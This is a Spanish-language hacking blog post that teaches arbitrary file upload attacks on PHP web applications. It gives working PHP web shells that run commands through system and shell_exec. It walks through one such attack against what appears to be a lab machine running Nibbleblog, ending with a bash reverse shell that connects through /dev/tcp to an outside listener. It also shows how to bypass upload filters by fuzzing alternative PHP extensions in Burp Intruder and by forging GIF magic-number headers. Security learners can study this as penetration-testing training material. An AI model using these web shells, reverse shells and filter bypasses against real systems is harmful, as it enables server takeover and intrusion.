---
title: Arbitrary File Upload Attack
author:
date: 02-03-2023
categories: [Hacking Web]
tags: [File Upload, Magic Numbers,Hexedit,Web]
pin: false
image:
  path: /assets/img/commons/FileUpload/FileUpload.png
  alt: File Upload Attack
---

Presentaré ahora en este apartado las técnicas para HackingWeb comenzando con una vulnerabilidad básica y muy conocida cuando se trata de subir archivos al sistema, reconocida y documentada por la OWASP top 10, pero como con un simple archivo a subir podemos tener una ejecución remota de comandos en el servidor?
La carga de archivos se está convirtiendo en una parte cada vez más esencial de cualquier aplicación, donde el usuario puede cargar su foto, su CV o un video que muestra un archivo 
Esta vulnerabilidad **ocurre en aplicaciones web donde existe la posibilidad de subir un archivo sin que sea comprobado por un sistema de seguridad** que frene peligros potenciales.  permite  **subir archivos con código _(scripts tales como .php o .aspx)_ y ejecutarlos en el mismo servidor.**

## Risks of arbitrary file uploading
La principales consecuencias de esta vulnerabilidad son: 

-   Sobrecarga del sistema o la base de datos a través de la subida excesiva de archivos
-   Denegación de servicio (causar la inaccesibilidad a un recurso o servicio)
-   Ejecución remota de código sobre el servidor

![](/assets/img/commons/FileUpload/file1.png)

Lo mas común de esta vulnerabilidad es aprovecharse de una ejecución remota de comandos o subir una webshell directamente y alojarla en el servidor, cargando el payload con una tipo de extensión específica, para esto tenemos que ver la interpretasión del código que nos de el servidor, la más común es inyectar código malicioso en php pero incluso podriamos jugar con diferentes extensiones que interpreta php al igual basarnos en los magic numbers (eso lo veremos mas adelante)
como anteriormente lo mencioné es muy común en sitios web que interpretan php por lo tanto veremos unas formas de inyectar nuestro código en un archivo

## PHP Reverse Shell Manual Multifuncional 
La más típica de las ejecuciones vía PHP que nos podemos configurar es la siguiente:

```php
<?php
	system('whoami');
?>
```
En vez de usar **system**, podemos usar **shell_exec**, más específico para la ejecución de comandos vía shell con retorno del output en formato string.
Esto se resume en la siguiente estructura:

```php
<?php
	echo shell_exec('whoami');
?>
```
En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

```
`http://192.168.1.X/fichero.php?cmd=whoami`
```
A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vía web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar añadiendo unas etiquetas de preformateado en nuestro script:

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
> Nota: Para explotar este tipo de vulnerabilidad sobre subidas de archivos es importante hacer una recopilación grande en todo el sistema en la parte de directorios para poder visualizar en que ruta almacena nuestro payload y posteriormente ejecutarlo

para este ejemplo utilizaré una máquina que es vulnerable a esta subida de archivos, por lo tanto supongamos en un entorno real que al logearte con tu cuenta de usuario o robandole las credenciales a admin al ingresar al panel tienes una sección donde te permite modificar y subir archivos y encontraste directorios en donde estos se almacenan
![](/assets/img/commons/FileUpload/web1.png)
tenemos examinar un elemento para subirlo a la web y arriba vemos my_image y plugins, si enumeraste bien y fuzzeas correctamente directorios podrias encontrar las rutas en donde posiblemente se almacenarán estos archivos a subir, en mi caso sería esta ruta
![](/assets/img/commons/FileUpload/web2.png)
apreciamos que se encuentra my_image que es donde se guardan aquellos archivos que se suban a la web en la sección de my_image.
Una vez identificado esto comenzaré a inyectar código malicioso en php en nuestro archivo que crearemos para tener ejecución de comandos de el lado del servidor, basandonos en algunas formas de inyección que presente al incio en la parte de **PHP Reverse Shell Manual Multifuncional**
![](/assets/img/commons/FileUpload/terminal.png)
en mi caso lo puse con etiquetas perfomateadas llamando a la función shell_exec nombrando cmd donde seguido de nuestra varibale 'cmd' vamos a poder tener nuestra ejecución de código y la guarde como reverse.php
ahora nos vamos al panel donde podemos subir el archivo, seleccionamos reverse.php y guardamos 
![](/assets/img/commons/FileUpload/terminal1.png)
una vez guardada vemos en los directorios que guarda el archivo en my_image ya está nuestro payload almacenado solo que aquí cambio mi nombre de reverse.php a image.php ya que por detrás esta asi configurado quitando nuestro nombre que pusimos en el archivo por (image) pero de todas formas no debería de ver ningun problema si nuestra integridad del payload no es modificada 
![](/assets/img/commons/FileUpload/terminal2.png)
si todo va bien al darle click en nuestro payload 'image.php' no debería de suceder nada hasta que mandemos a llamar a nuestra función que establecimos que es 'cmd',quedando de la siguiente forma:
```console
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd= (aqui es donde ejecutarás el comando a desear)
```
en mi caso para ver si tengo un RCE en esta pequeña webshell ejecuté el comando id y efectivamente vemos que ya nos muestra el UID y el GID del usuario especificado, además de sus grupos secundarios
![](/assets/img/commons/FileUpload/terminal3.png)
asi que en este punto para interactuar mas comodamente te puedes enviar una reverse shell y acceder al sistema desde tu terminal
```console
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261'
```
> Importante el url encode de los amperson para que no de problemas

![](/assets/img/commons/FileUpload/terminal4.png)
al darle enter si nos ponemos en modo escucha por el puerto específicado ya estariamos dentro del servidor
![](/assets/img/commons/FileUpload/terminal5.png)
todo bien peero no todo es color de rosa y sencillo hay sistemas en donde no deja subir con ese tipo de extensiones, a donde me lleva el siguiente paso 

## PHP extensions in File Upload
Dado que no sabemos dónde el servidor está dividiendo el nombre del archivo para verificar la extensión, el siguiente paso es intentar engañar cambiando el nombre de mi .php a .jpg.php. se intenta  cargar el archivo php con diferentes extensiones de php. Dado que hay varias versiones de php, hay muchas extensiones de archivo php fuera de solo .php. Para probar estas diferentes extensiones, voy a copiar mi shell de php inicial y cambiar el nombre de cada una de las diversas extensiones de php: phar, phtml, pht, phps, php3, php4 y php5.
para esto podríamos ayudarnos de burpusite y subir diferentes tipos de extensiones en php.
Primero interceptamos la petición con burpsuite al guadar nuestro payload 
![](/assets/img/commons/FileUpload/terminal6.png)
después damos CTRL + I para enviar la petición al intruder eligiendo el tipo de ataque sniper y borraré los paylaod markers que aparecen por defecto, esos payload markers interpretan en donde se hará el fuzzeo en mi caso solo lo quiero en la extensión php que es donde fuzzearé por multiples extensiones con php quedando de la soguiente forma:
![](/assets/img/commons/FileUpload/terminal7.png)
en la sección de payload vamos a añadir todo el tipo de extensiones php que nos pueda interpretar el servidor incluso en gif, png, phar,png etc.
![](/assets/img/commons/FileUpload/terminal8.png)
si le damos star attack vemos el fuzzing en las extensiones con un status de 200 eso quiere decir que fueron colocadas correctamente 
![](/assets/img/commons/FileUpload/terminal9.png)
ahora tendremos que visualizar si en el lado del servidor se ejecuta nuestra función shell_exec para ejecutar comandos y aquí vemos todas las extensiones a probar de nuestra función shell_exec
![](/assets/img/commons/FileUpload/web3.png) 
si intentamos hacerlo desde una extensión  como png,jpg o gif vemos un error si interpreta la extensión pero no el código a la llamada  del sistema
![](/assets/img/commons/FileUpload/web4.png)
pero si probamos con pthml llamando a nuestra función cmd logramos tener ejecución remota de comandos
![](/assets/img/commons/FileUpload/web5.png)

En caso de que las extensiones esten bloqueadas podriamos intentar un bypassing a través de los magic numbers cambiando la priemra serie de bloques de bytes de nuestro archivo es a lo que me lleva a lo siguiente

## Bypassing Magic Number Filtering String Method 
Este filtrado analiza el identificador del archivo para validar el tipo, que son los primeros contenidos de cualquier archivo. Para eludir este tipo de filtro, necesitamos falsificar el número mágico para que el servidor piense que nuestro archivo es un tipo de archivo aceptado cuando en realidad es un script malicioso.
sabemos que debemos hacer que el servidor piense que nuestro script php es un archivo gif.  Hay dos formas de hacer esta opción, la primera es colocando el respectivo nombre al archivo que se desea convertir seguido de punto y coma, y la otra es editando los primeros números bloques de bytes que están en hexadecimal .
Para ayudarnos, usaremos la [lista de firmas de archivos en Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
(datos utilizados para identificar o verificar el contenido de un archivo. Estas firmas también se conocen como [números mágicos](https://en.wikipedia.org/wiki/Magic_number_(programming)#In_files "Número mágico (programación)") o Magic Bytes.)
```console
> BMP : 42 4D  
> JPG: FF D8 FF E0  
> PNG: 89 50 4E 47  
> GIF: 47 49 46 38
``` 
normalemente este tipo de ataques con filtros de magic numbers se da más en aquellos sitios que no permiten una extensión específica en php para eso esta burlar el sistema con los primero bloques de bytes
por ejemplo podríamos buscar en este gráfico el tipo de archivo gif, veremos que hay dos identificadores:
![](/assets/img/commons/FileUpload/file2.png)

Para esto con la herramienta hacktools me copié y pegué una reverse shell completa en php.
Podemos usar cualquiera de estos, así que usaremos el primero. Dado que tiene seis bytes de longitud, agregaremos seis caracteres aleatorios al comienzo de nuestro script php
agregamos seis A en la primera línea del script y usé el comando de archivo para confirmar que actualmente se está identificando como un archivo de texto
![](/assets/img/commons/FileUpload/terminal10.png)
si inspeccionamos con file vemos lo siguiente
```console
$ file reverse_shell.php 
reverse_shell.php: ASCII text
```
por lo tanto me lo toma como texto pero si agregamos la cabezera de GIF nos sale lo siguiente:
![](/assets/img/commons/FileUpload/terminal11.png)
![](/assets/img/commons/FileUpload/terminal12.png)

ahora si queremos cambiar es importante interceptar el payload y la petición vamos a definir el Content-Type y dentro de nuestro archivo como encabezado definir el tipo de archivo en este caso será un GIF

```
> Content-Disposition: form-data; name=”myFile”; filename=”payload.php.gif”  
> Content-Type: image/gif
> 
> GIF89a;  
> <?php system($_GET[‘cmd’]);?>
```
> Importante : El "Content-Type" encabezado de respuesta puede proporcionar pistas sobre qué tipo de archivo cree que ha servido el servidor. Si este encabezado no ha sido establecido explícitamente por el código de la aplicación, normalmente contiene el resultado de la asignación de extensión de archivo/tipo 

## Bypassing Magic Number Filtering Hexadecimal 
para esto agregaré hasta arriba 6 A y ver su representación en hexadecimal
Si hemos agregado seis caracteres al comienzo de la secuencia de comandos, notaremos que al hacerlo agregó el código hexadecimal correspondiente. En este caso, 4141 4141 4141.

![](/assets/img/commons/FileUpload/terminal13.png)

Para falsificar el número mágico, simplemente reemplazaremos esos seis bytes con uno de los dos números mágicos para GIF. Una vez que hagamos eso, podemos guardar el archivo y usaremos el comando de archivo nuevamente para verificar el tipo de archivo.
modificaré esos bloques de bytes para convertirlo en GIF87a
```console
47 49 46 38 37 61 GIF87a
```
![](/assets/img/commons/FileUpload/terminal14.png)
y vemos que automaticamente de el lado derecho me lo convierte a GIF

![](/assets/img/commons/FileUpload/terminal15.png)

¡Éxito! El archivo ahora se reconoce como un GIF. Al intentar cargar el archivo nuevamente, recibimos un mensaje de "Carga de archivo exitosa", por lo que hemos logrado pasar por alto el filtrado de números mágicos en el lado del servidor.

